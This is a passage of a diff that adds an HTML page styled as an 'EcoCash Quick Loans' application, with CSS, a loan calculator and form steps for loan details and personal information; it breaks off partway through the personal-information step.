@@ -1,0 +1,1838 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>EcoCash - Quick Loans</title>
+    <meta name="description" content="Apply for personal, business, or auto loans with our easy-to-use loan application. Get competitive rates and fast approval." />
+    <meta name="author" content="EcoCash" />
+    <meta property="og:title" content="EcoCash - Quick Loans" />
+    <meta property="og:description" content="Apply for personal, business, or auto loans with our easy-to-use loan application." />
+    <meta property="og:type" content="website" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:site" content="@EcoCash" />
+
+    <style>
+        :root {
+            --background: 210 20% 98%;
+            --foreground: 220 20% 10%;
+            --card: 0 0% 100%;
+            --card-foreground: 220 20% 10%;
+            --popover: 0 0% 100%;
+            --popover-foreground: 220 20% 10%;
+            --primary: 145 80% 45%;
+            --primary-foreground: 0 0% 100%;
+            --primary-glow: 145 90% 55%;
+            --secondary: 210 25% 95%;
+            --secondary-foreground: 220 20% 10%;
+            --muted: 210 15% 92%;
+            --muted-foreground: 220 10% 45%;
+            --accent: 215 80% 55%;
+            --accent-foreground: 0 0% 100%;
+            --destructive: 0 72% 51%;
+            --destructive-foreground: 0 0% 100%;
+            --success: 152 69% 40%;
+            --success-foreground: 0 0% 100%;
+            --success-light: 152 60% 95%;
+            --border: 210 20% 88%;
+            --input: 210 20% 88%;
+            --ring: 0 85% 50%;
+            --radius: .75rem;
+            --eco-red: 145 80% 45%;
+            --eco-blue: 215 80% 55%;
+            --eco-dark: 220 25% 12%;
+            --gradient-primary: linear-gradient(135deg, hsl(145 80% 45%), hsl(140 85% 55%));
+            --gradient-accent: linear-gradient(135deg, hsl(215 80% 55%), hsl(215 90% 65%));
+            --gradient-dark: linear-gradient(135deg, hsl(220 25% 12%), hsl(220 20% 20%));
+            --gradient-background: linear-gradient(180deg, hsl(210 20% 98%) 0%, hsl(210 25% 96%) 100%);
+            --gradient-card: linear-gradient(180deg, hsl(0 0% 100%) 0%, hsl(210 20% 99%) 100%);
+            --shadow-sm: 0 1px 2px 0 hsl(220 20% 10% / .05);
+            --shadow-md: 0 4px 6px -1px hsl(220 20% 10% / .08), 0 2px 4px -2px hsl(220 20% 10% / .04);
+            --shadow-lg: 0 10px 15px -3px hsl(220 20% 10% / .1), 0 4px 6px -4px hsl(220 20% 10% / .05);
+            --shadow-glow: 0 0 20px hsl(145 80% 45% / .25);
+            --sidebar-background: 0 0% 98%;
+            --sidebar-foreground: 240 5.3% 26.1%;
+            --sidebar-primary: 240 5.9% 10%;
+            --sidebar-primary-foreground: 0 0% 98%;
+            --sidebar-accent: 240 4.8% 95.9%;
+            --sidebar-accent-foreground: 240 5.9% 10%;
+            --sidebar-border: 220 13% 91%;
+            --sidebar-ring: 217.2 91.2% 59.8%;
+        }
+
+        /* ----- reset & base ----- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            background: hsl(var(--background));
+            color: hsl(var(--foreground));
+            line-height: 1.5;
+            min-height: 100vh;
+        }
+
+        /* ----- header / eco-header ----- */
+        .eco-header {
+            width: 100%;
+            padding: 0.75rem 1rem;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 50;
+            background: hsl(var(--card));
+            border-bottom: 1px solid hsl(var(--border));
+            box-shadow: var(--shadow-sm);
+        }
+
+        .eco-header .max-w-7xl {
+            max-width: 1280px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .logo-icon {
+            width: 2rem;
+            height: 2rem;
+            border-radius: var(--radius);
+            background: var(--gradient-primary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: var(--shadow-glow);
+        }
+
+        .logo-icon svg {
+            width: 1.25rem;
+            height: 1.25rem;
+            color: hsl(var(--primary-foreground));
+        }
+
+        .logo-text h1 {
+            font-size: 1.25rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+        }
+
+        .logo-text h1 .blue {
+            color: hsl(var(--eco-blue));
+        }
+        .logo-text h1 .red {
+            color: hsl(var(--eco-red));
+        }
+
+        .logo-text .sub {
+            display: none;
+            font-size: 0.7rem;
+            color: hsl(var(--muted-foreground));
+        }
+
+        .header-right {
+            text-align: right;
+        }
+        .header-right .help {
+            font-size: 0.7rem;
+            color: hsl(var(--muted-foreground));
+        }
+        .header-right .ussd {
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: hsl(var(--eco-blue));
+        }
+
+        /* ----- main container ----- */
+        .main-wrapper {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 5rem 1rem 2rem;
+            background: var(--gradient-background);
+        }
+
+        /* ----- page sections ----- */
+        .page-section {
+            display: none;
+            width: 100%;
+            max-width: 480px;
+        }
+
+        .page-section.active {
+            display: block;
+            animation: fadeIn 0.4s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(12px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* ----- loan cards ----- */
+        .loan-card {
+            width: 100%;
+            background: hsl(var(--card));
+            border: 1px solid hsl(var(--border));
+            border-radius: calc(var(--radius) * 2);
+            padding: 1.5rem 1.25rem;
+            box-shadow: var(--shadow-lg);
+            transition: box-shadow 0.3s ease, transform 0.3s ease;
+            background: var(--gradient-card);
+        }
+
+        .loan-card:hover {
+            box-shadow: var(--shadow-lg), var(--shadow-glow);
+            transform: translateY(-2px);
+        }
+
+        .loan-card .card-title {
+            text-align: center;
+            margin-bottom: 1.5rem;
+        }
+        .loan-card .card-title h2 {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: hsl(var(--foreground));
+        }
+        .loan-card .card-title p {
+            color: hsl(var(--muted-foreground));
+            font-size: 0.8rem;
+        }
+
+        /* ----- gradient text helper ----- */
+        .text-gradient {
+            background: var(--gradient-primary);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .text-gradient-accent {
+            background: var(--gradient-accent);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        /* ----- progress steps ----- */
+        .steps-wrap {
+            margin-bottom: 1.5rem;
+        }
+        .step-bars {
+            display: flex;
+            gap: 0.4rem;
+            margin-bottom: 0.5rem;
+        }
+        .step-bars .bar {
+            height: 6px;
+            flex: 1;
+            border-radius: 999px;
+            background: hsl(var(--muted));
+            transition: background 0.3s;
+        }
+        .step-bars .bar.active {
+            background: hsl(var(--primary));
+            box-shadow: var(--shadow-glow);
+        }
+        .step-labels {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.65rem;
+            font-weight: 500;
+            color: hsl(var(--muted-foreground));
+        }
+        .step-labels .active-label {
+            color: hsl(var(--primary));
+            font-weight: 600;
+        }
+
+        /* ----- calculator box ----- */
+        .calc-box {
+            background: hsl(var(--secondary));
+            border: 1px solid hsl(var(--border));
+            border-radius: var(--radius);
+            padding: 1.25rem 1rem;
+            margin-bottom: 1.75rem;
+        }
+        .calc-header {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 1rem;
+        }
+        .calc-header svg {
+            width: 1.25rem;
+            height: 1.25rem;
+            color: hsl(var(--eco-blue));
+        }
+        .calc-header h3 {
+            font-size: 1rem;
+            font-weight: 600;
+            color: hsl(var(--foreground));
+        }
+
+        .range-group {
+            margin-bottom: 1.25rem;
+        }
+        .range-group .range-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 0.25rem;
+        }
+        .range-group .range-top label {
+            font-size: 0.8rem;
+            font-weight: 500;
+            color: hsl(var(--foreground));
+        }
+        .range-group .range-top .value {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: hsl(var(--primary));
+        }
+
+        input[type="range"] {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 100%;
+            height: 6px;
+            border-radius: 999px;
+            background: hsl(var(--muted));
+            outline: none;
+            transition: background 0.2s;
+        }
+        input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            background: hsl(var(--primary));
+            cursor: pointer;
+            box-shadow: var(--shadow-glow);
+            border: 2px solid hsl(var(--card));
+            transition: transform 0.2s;
+        }
+        input[type="range"]::-webkit-slider-thumb:hover {
+            transform: scale(1.1);
+        }
+        input[type="range"]::-moz-range-thumb {
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            background: hsl(var(--primary));
+            cursor: pointer;
+            border: 2px solid hsl(var(--card));
+            box-shadow: var(--shadow-glow);
+        }
+
+        .range-labels {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.6rem;
+            color: hsl(var(--muted-foreground));
+            margin-top: 0.2rem;
+        }
+
+        .divider {
+            border: 0;
+            height: 1px;
+            background: hsl(var(--border));
+            margin: 0.75rem 0;
+        }
+
+        .payment-box {
+            background: hsl(var(--card));
+            border-radius: var(--radius);
+            padding: 1rem;
+            text-align: center;
+            box-shadow: var(--shadow-sm);
+            border: 1px solid hsl(var(--border));
+        }
+        .payment-box .label {
+            font-size: 0.75rem;
+            color: hsl(var(--muted-foreground));
+        }
+        .payment-box .amount {
+            font-size: 1.8rem;
+            font-weight: 700;
+            background: var(--gradient-primary);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .payment-box .footnote {
+            font-size: 0.65rem;
+            color: hsl(var(--muted-foreground));
+            margin-top: 0.25rem;
+        }
+
+        /* ----- form fields ----- */
+        .form-section {
+            margin-top: 0.25rem;
+        }
+        .form-section h3 {
+            font-size: 1rem;
+            font-weight: 600;
+            color: hsl(var(--foreground));
+            margin-bottom: 1rem;
+        }
+
+        .field {
+            margin-bottom: 1rem;
+        }
+        .field label {
+            display: block;
+            font-size: 0.8rem;
+            font-weight: 500;
+            color: hsl(var(--foreground));
+            margin-bottom: 0.3rem;
+        }
+
+        .input-field,
+        .select-field {
+            width: 100%;
+            padding: 0.7rem 0.9rem;
+            border-radius: var(--radius);
+            border: 1.5px solid hsl(var(--input));
+            background: hsl(var(--card));
+            font-size: 0.9rem;
+            color: hsl(var(--foreground));
+            transition: border-color 0.2s, box-shadow 0.1s;
+            outline: none;
+        }
+        .input-field:focus,
+        .select-field:focus {
+            border-color: hsl(var(--primary));
+            box-shadow: 0 0 0 3px hsl(var(--primary) / .12);
+        }
+        .input-field::placeholder {
+            color: hsl(var(--muted-foreground));
+        }
+        .select-field {
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%236b7a8a' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 1rem center;
+            cursor: pointer;
+        }
+
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 0.75rem;
+        }
+
+        /* Phone input with country code - SIMPLIFIED (no flags) */
+        .phone-input-group {
+            display: flex;
+            align-items: center;
+            border: 1.5px solid hsl(var(--input));
+            border-radius: var(--radius);
+            background: hsl(var(--card));
+            transition: border-color 0.2s, box-shadow 0.1s;
+            overflow: hidden;
+        }
+        .phone-input-group:focus-within {
+            border-color: hsl(var(--primary));
+            box-shadow: 0 0 0 3px hsl(var(--primary) / .12);
+        }
+        .phone-input-group .country-selector {
+            display: flex;
+            align-items: center;
+            padding: 0.5rem 0.6rem;
+            border-right: 1.5px solid hsl(var(--input));
+            background: hsl(var(--secondary));
+            flex-shrink: 0;
+        }
+        .phone-input-group .country-selector select {
+            background: transparent;
+            border: none;
+            font-weight: 600;
+            font-size: 0.85rem;
+            color: hsl(var(--foreground));
+            outline: none;
+            cursor: pointer;
+            padding: 0.1rem 0.3rem;
+            min-width: 70px;
+            font-family: inherit;
+        }
+        .phone-input-group .country-selector select:focus {
+            outline: 2px solid hsl(var(--eco-blue) / 0.3);
+            border-radius: 4px;
+        }
+        .phone-input-group .phone-input {
+            flex: 1;
+            border: none;
+            outline: none;
+            font-size: 0.9rem;
+            background: transparent;
+            padding: 0.7rem 0.9rem;
+            min-width: 0;
+            color: hsl(var(--foreground));
+        }
+        .phone-input-group .phone-input::placeholder {
+            color: hsl(var(--muted-foreground));
+        }
+
+        /* ----- summary box ----- */
+        .summary-box {
+            background: hsl(var(--secondary));
+            border: 1px solid hsl(var(--border));
+            border-radius: var(--radius);
+            padding: 1.25rem 1rem;
+            margin: 1.25rem 0 1rem;
+        }
+        .summary-box h4 {
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: hsl(var(--foreground));
+            margin-bottom: 0.75rem;
+        }
+        .summary-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0.5rem 0;
+            border-bottom: 1px solid hsl(var(--border));
+        }
+        .summary-row:last-child {
+            border-bottom: none;
+        }
+        .summary-row .left {
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            color: hsl(var(--muted-foreground));
+            font-size: 0.75rem;
+        }
+        .summary-row .left svg {
+            width: 1rem;
+            height: 1rem;
+            flex-shrink: 0;
+            color: hsl(var(--primary));
+        }
+        .summary-row .right {
+            font-weight: 500;
+            font-size: 0.8rem;
+            text-align: right;
+            max-width: 55%;
+            word-break: break-word;
+            color: hsl(var(--foreground));
+        }
+
+        /* ----- buttons ----- */
+        .btn-group {
+            display: flex;
+            flex-direction: column;
+            gap: 0.75rem;
+            margin-top: 0.5rem;
+        }
+
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            width: 100%;
+            padding: 0.85rem 1.2rem;
+            font-weight: 600;
+            font-size: 0.95rem;
+            border: none;
+            border-radius: var(--radius);
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-decoration: none;
+        }
+        .btn-primary {
+            background: var(--gradient-primary);
+            color: hsl(var(--primary-foreground));
+            box-shadow: var(--shadow-glow);
+        }
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-glow), var(--shadow-lg);
+        }
+        .btn-primary:active {
+            transform: scale(0.97);
+        }
+        .btn-accent {
+            background: var(--gradient-accent);
+            color: hsl(var(--accent-foreground));
+            box-shadow: 0 4px 16px hsl(var(--eco-blue) / .3);
+        }
+        .btn-accent:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 24px hsl(var(--eco-blue) / .4);
+        }
+        .btn-accent:active {
+            transform: scale(0.97);
+        }
+        .btn-success {
+            background: var(--gradient-primary);
+            color: hsl(var(--success-foreground));
+            box-shadow: 0 4px 16px hsl(var(--primary) / .3);
+        }
+        .btn-success:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 24px hsl(var(--primary) / .4);
+        }
+        .btn-success:active {
+            transform: scale(0.97);
+        }
+        .btn-secondary {
+            background: hsl(var(--secondary));
+            color: hsl(var(--secondary-foreground));
+            border: 1px solid hsl(var(--border));
+        }
+        .btn-secondary:hover {
+            background: hsl(var(--muted));
+            transform: translateY(-2px);
+        }
+        .btn-secondary:active {
+            transform: scale(0.97);
+        }
+
+        .btn svg {
+            width: 1.1rem;
+            height: 1.1rem;
+            flex-shrink: 0;
+        }
+
+        .btn-back {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            padding: 0.6rem 1.2rem;
+            background: transparent;
+            color: hsl(var(--eco-blue));
+            font-weight: 500;
+            font-size: 0.9rem;
+            border: 1.5px solid hsl(var(--border));
+            border-radius: var(--radius);
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-top: 0.75rem;
+            width: 100%;
+        }
+        .btn-back:hover {
+            background: hsl(var(--secondary));
+            border-color: hsl(var(--primary));
+            transform: translateY(-2px);
+        }
+
+        .footer-note {
+            text-align: center;
+            margin-top: 1.5rem;
+            font-size: 0.7rem;
+            color: hsl(var(--muted-foreground));
+        }
+        .footer-note .brand {
+            color: hsl(var(--primary));
+            font-weight: 600;
+        }
+
+        /* ----- success page ----- */
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 1.5rem;
+            background: var(--gradient-primary);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: var(--shadow-glow);
+        }
+        .success-icon svg {
+            width: 48px;
+            height: 48px;
+            color: #fff;
+        }
+        .success-name {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: hsl(var(--primary));
+            margin: 0.5rem 0;
+        }
+        .success-message {
+            color: hsl(var(--muted-foreground));
+            font-size: 0.9rem;
+            margin: 1rem 0;
+        }
+        .redirect-timer {
+            margin-top: 1.5rem;
+            padding: 0.75rem;
+            background: hsl(var(--secondary));
+            border-radius: var(--radius);
+            font-size: 0.8rem;
+            color: hsl(var(--muted-foreground));
+            border: 1px solid hsl(var(--border));
+        }
+        .redirect-timer strong {
+            color: hsl(var(--primary));
+        }
+
+        /* error message style */
+        .field-error {
+            color: hsl(var(--destructive));
+            font-size: 0.75rem;
+            margin-top: 0.25rem;
+            display: none;
+        }
+        .field-error.visible {
+            display: block;
+        }
+        .input-field.error,
+        .select-field.error,
+        .phone-input-group.error {
+            border-color: hsl(var(--destructive));
+        }
+        .phone-input-group.error .phone-input {
+            border-color: hsl(var(--destructive));
+        }
+
+        /* ----- responsive adjustments ----- */
+        @media (min-width: 480px) {
+            .eco-header {
+                padding: 1rem 1.5rem;
+            }
+            .logo-icon {
+                width: 2.5rem;
+                height: 2.5rem;
+            }
+            .logo-icon svg {
+                width: 1.4rem;
+                height: 1.4rem;
+            }
+            .logo-text h1 {
+                font-size: 1.5rem;
+            }
+            .logo-text .sub {
+                display: block;
+            }
+            .loan-card {
+                padding: 2rem 2rem;
+            }
+            .loan-card .card-title h2 {
+                font-size: 1.8rem;
+            }
+            .calc-box {
+                padding: 1.5rem 1.5rem;
+            }
+            .payment-box .amount {
+                font-size: 2.2rem;
+            }
+            .btn-group {
+                flex-direction: row;
+            }
+            .btn-group .btn {
+                flex: 1;
+            }
+        }
+
+        @media (max-width: 420px) {
+            .grid-2 {
+                grid-template-columns: 1fr;
+                gap: 0;
+            }
+            .summary-row .left span {
+                font-size: 0.7rem;
+            }
+            .summary-row .right {
+                font-size: 0.7rem;
+            }
+            .phone-input-group .country-selector select {
+                font-size: 0.75rem;
+                min-width: 60px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- HEADER -->
+    <header class="eco-header">
+        <div class="max-w-7xl">
+            <div class="header-left">
+                <div class="logo-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M19 7V4a1 1 0 0 0-1-1H5a2 2 0 0 0 0 4h15a1 1 0 0 1 1 1v4h-3a2 2 0 0 0 0 4h3a1 1 0 0 0 1-1v-2a1 1 0 0 0-1-1" />
+                        <path d="M3 5v14a2 2 0 0 0 2 2h15a1 1 0 0 0 1-1v-4" />
+                    </svg>
+                </div>
+                <div class="logo-text">
+                    <h1><span class="blue">Eco</span><span class="red">Cash</span></h1>
+                    <span class="sub">Quick Loans</span>
+                </div>
+            </div>
+            <div class="header-right">
+                <div class="help">Need help?</div>
+                <div class="ussd">*151#</div>
+            </div>
+        </div>
+    </header>
+
+    <!-- MAIN CONTENT -->
+    <main class="main-wrapper">
+
+        <!-- PAGE 1: Calculator -->
+        <section id="page-calculator" class="page-section active">
+            <div class="loan-card">
+                <div class="card-title">
+                    <h2>Quick Loan <span class="text-gradient">Calculator</span></h2>
+                    <p>Calculate your estimated monthly payment</p>
+                </div>
+
+                <div class="calc-box">
+                    <div class="calc-header">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <rect x="4" y="2" width="16" height="20" rx="2" />
+                            <line x1="8" y1="6" x2="16" y2="6" />
+                            <line x1="16" y1="14" x2="16" y2="18" />
+                            <path d="M16 10h.01" />
+                            <path d="M12 10h.01" />
+                            <path d="M8 10h.01" />
+                            <path d="M12 14h.01" />
+                            <path d="M8 14h.01" />
+                            <path d="M12 18h.01" />
+                            <path d="M8 18h.01" />
+                        </svg>
+                        <h3>Loan Calculator</h3>
+                    </div>
+
+                    <div class="range-group">
+                        <div class="range-top">
+                            <label>Loan Amount</label>
+                            <span class="value" id="calc-amount-display">$2,500</span>
+                        </div>
+                        <input type="range" id="calc-amount" min="100" max="5000" step="100" value="2500" />
+                        <div class="range-labels">
+                            <span>$100</span>
+                            <span>$5,000</span>
+                        </div>
+                    </div>
+
+                    <hr class="divider" />
+
+                    <div class="range-group">
+                        <div class="range-top">
+                            <label>Loan Term</label>
+                            <span class="value" id="calc-term-display">12 months</span>
+                        </div>
+                        <input type="range" id="calc-term" min="6" max="60" step="6" value="12" />
+                        <div class="range-labels">
+                            <span>6 months</span>
+                            <span>60 months</span>
+                        </div>
+                    </div>
+
+                    <div class="payment-box">
+                        <div class="label">Estimated Monthly Payment</div>
+                        <div class="amount" id="calc-payment">$219.79</div>
+                        <div class="footnote">*Based on 10% APR. Final rate may vary.</div>
+                    </div>
+                </div>
+
+                <button class="btn btn-primary" id="applyNowBtn" style="width:100%;">
+                    Apply Now
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M5 12h14" />
+                        <path d="m12 5 7 7-7 7" />
+                    </svg>
+                </button>
+
+                <div class="footer-note">
+                    <div>Your information is secure and encrypted</div>
+                    <div>Powered by <span class="brand">EcoCash</span></div>
+                </div>
+            </div>
+        </section>
+
+        <!-- PAGE 2: Loan Details (Step 1) -->
+        <section id="page-step1" class="page-section">
+            <div class="loan-card">
+                <div class="card-title">
+                    <h2>Loan Application</h2>
+                    <p>Complete the form below to apply for your loan</p>
+                </div>
+
+                <div class="steps-wrap">
+                    <div class="step-bars">
+                        <span class="bar active"></span>
+                        <span class="bar"></span>
+                        <span class="bar"></span>
+                        <span class="bar"></span>
+                    </div>
+                    <div class="step-labels">
+                        <span class="active-label">Loan Details</span>
+                        <span>Personal Info</span>
+                        <span>Employment</span>
+                        <span>Review</span>
+                    </div>
+                </div>
+
+                <div class="calc-box">
+                    <div class="calc-header">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <rect x="4" y="2" width="16" height="20" rx="2" />
+                            <line x1="8" y1="6" x2="16" y2="6" />
+                            <line x1="16" y1="14" x2="16" y2="18" />
+                            <path d="M16 10h.01" />
+                            <path d="M12 10h.01" />
+                            <path d="M8 10h.01" />
+                            <path d="M12 14h.01" />
+                            <path d="M8 14h.01" />
+                            <path d="M12 18h.01" />
+                            <path d="M8 18h.01" />
+                        </svg>
+                        <h3>Loan Calculator</h3>
+                    </div>
+
+                    <div class="range-group">
+                        <div class="range-top">
+                            <label>Loan Amount</label>
+                            <span class="value" id="step1-amount-display">$2,500</span>
+                        </div>
+                        <input type="range" id="step1-amount" min="100" max="5000" step="100" value="2500" />
+                        <div class="range-labels">
+                            <span>$100</span>
+                            <span>$5,000</span>
+                        </div>
+                    </div>
+
+                    <hr class="divider" />
+
+                    <div class="range-group">
+                        <div class="range-top">
+                            <label>Loan Term</label>
+                            <span class="value" id="step1-term-display">12 months</span>
+                        </div>
+                        <input type="range" id="step1-term" min="6" max="60" step="6" value="12" />
+                        <div class="range-labels">
+                            <span>6 months</span>
+                            <span>60 months</span>
+                        </div>
+                    </div>
+
+                    <div class="payment-box">
+                        <div class="label">Estimated Monthly Payment</div>
+                        <div class="amount" id="step1-payment">$219.79</div>
+                        <div class="footnote">*Based on 10% APR. Final rate may vary.</div>
+                    </div>
+                </div>
+
+                <div class="form-section">
+                    <h3>Loan Details</h3>
+
+                    <div class="field">
+                        <label>Loan Type</label>
+                        <select class="select-field" id="loanType">
+                            <option value="">Select loan type</option>
+                            <option value="Personal Loan">Personal Loan</option>
+                            <option value="Business Loan">Business Loan</option>
+                            <option value="Auto Loan">Auto Loan</option>
+                        </select>
+                        <div class="field-error" id="loanTypeError">This field is required</div>
+                    </div>
+
+                    <div class="grid-2">
+                        <div class="field">
+                            <label>Loan Amount ($)</label>
+                            <input type="number" class="input-field" id="loanAmountInput" placeholder="Enter amount" value="2500" />
+                            <div class="field-error" id="loanAmountError">Please enter a valid loan amount (minimum $100)</div>
+                        </div>
+                        <div class="field">
+                            <label>Loan Term</label>
+                            <select class="select-field" id="loanTermSelect">
+                                <option value="6">6 Months</option>
+                                <option value="12" selected>12 Months</option>
+                                <option value="24">24 Months</option>
+                                <option value="36">36 Months</option>
+                                <option value="48">48 Months</option>
+                                <option value="60">60 Months</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="field">
+                        <label>Purpose of Loan</label>
+                        <input type="text" class="input-field" id="loanPurpose" placeholder="What will you use the loan for?" />
+                        <div class="field-error" id="loanPurposeError">This field is required</div>
+                    </div>
+
+                    <div class="btn-group">
+                        <button class="btn btn-secondary" id="backToCalculator">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="m12 19-7-7 7-7" />
+                                <path d="M19 12H5" />
+                            </svg>
+                            Back
+                        </button>
+                        <button class="btn btn-primary" id="nextToPersonal">
+                            Next Step
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M5 12h14" />
+                                <path d="m12 5 7 7-7 7" />
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+
+                <div class="footer-note">
+                    <div>Your information is secure and encrypted</div>
+                    <div>Powered by <span class="brand">EcoCash</span></div>
+                </div>
+            </div>
+        </section>
+
+        <!-- PAGE 3: Personal Information (Step 2) -->
+        <section id="page-step2" class="page-section">
+            <div class="loan-card">
+                <div class="card-title">
+                    <h2>Loan Application</h2>
+                    <p>Complete the form below to apply for your loan</p>
+                </div>
+
+                <div class="steps-wrap">
+                    <div class="step-bars">
+                        <span class="bar active"></span>
+                        <span class="bar active"></span>
+                        <span class="bar"></span>
+                        <span class="bar"></span>
+                    </div>
+                    <div class="step-labels">
+                        <span>Loan Details</span>
+                        <span class="active-label">Personal Info</span>
+                        <span>Employment</span>
+                        <span>Review</span>
+                    </div>
+                </div>
+
+                <div class="form-section">
+                    <h3>Personal Information</h3>
+
+                    <div class="grid-2">
+                        <div class="field">
+                            <label>First Name</label>
+                            <input type="text" class="input-field" id="firstName" placeholder="John" />
+                            <div class="field-error" id="firstNameError">This field is required</div>
+                        </div>
+                        <div class="field">
+                            <label>Last Name</label>
+                            <input type="text" class="input-field" id="lastName" placeholder="Doe" />
+                            <div class="field-error" id="lastNameError">This field is required</div>
+                        </div>
+                    </div>
+
+                    <div class="field">
+                        <label>Email Address</label>
+                        <input type="email" class="input-field" id="email" placeholder="john.doe@example.com" />
+                        <div class="field-error" id="emailError">Please enter a valid email address</div>
+                    </div>
+
+                    <div class="field">
+                        <label>Phone Number</label>
+                        <div class="phone-input-group" id="phoneGroup">
+                            <div class="country-selector">
+                                <select id="countryCode" aria-label="Country code">
+                                    <option value="+263">+263</option>
+                                    <option value="+27">+27</option>
+                                    <option value="+260">+260</option>
+                                    <option value="+255">+255</option>
+                                    <option value="+254">+254</option>
+                                    <option value="+256">+256</option>
+                                    <option value="+233">+233</option>
+                                    <option value="+234">+234</option>
+                                    <option value="+44">+44</option>
+                                    <option value="+1">+1</option>
+                                    <option value="+91">+91</option>
+                                    <option value="+61">+61</option>
+                                    <option value="+86">+86</option>
+                                    <option value="+81">+81</option>
+                                    <option value="+49">+49</option>
+                                    <option value="+33">+33</option>
+                                    <option value="+39">+39</option>
+                                    <option value="+34">+34</option>
+                                    <option value="+55">+55</option>
+                                    <option value="+52">+52</option>
+                                    <option value="+7">+7</option>
+                                    <option value="+82">+82</option>
+                                    <option value="+31">+31</option>
+                                    <option value="+46">+46</option>
+                                    <option value="+41">+41</option>
+                                    <option value="+64">+64</option>
+                                    <option value="+65">+65</option>
+                                    <option value="+60">+60</option>
+                                    <option value="+63">+63</option>
+                                    <option value="+62">+62</option>
+                                    <option value="+66">+66</option>
+                                    <option value="+971">+971</option>
+                                    <option value="+966">+966</option>
+                                    <option value="+972">+972</option>
+                                    <option value="+353">+353</option>
+                                    <option value="+45">+45</option>
+                                    <option value="+47">+47</option>
+                                    <option value="+358">+358</option>
+                                    <option value="+30">+30</option>
+                                    <option value="+90">+90</option>
+                                    <option value="+20">+20</option>
+                                </select>
+                            </div>
+                            <input type="tel" class="phone-input" id="phone" placeholder="Phone Number" maxlength="15" />
+                        </div>
+                        <div class="field-error" id="phoneError">Please enter a valid phone number</div>
+                    </div>
+
+                    <div class="btn-group">
+                        <button class="btn btn-secondary" id="backToStep1">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="m12 19-7-7 7-7" />
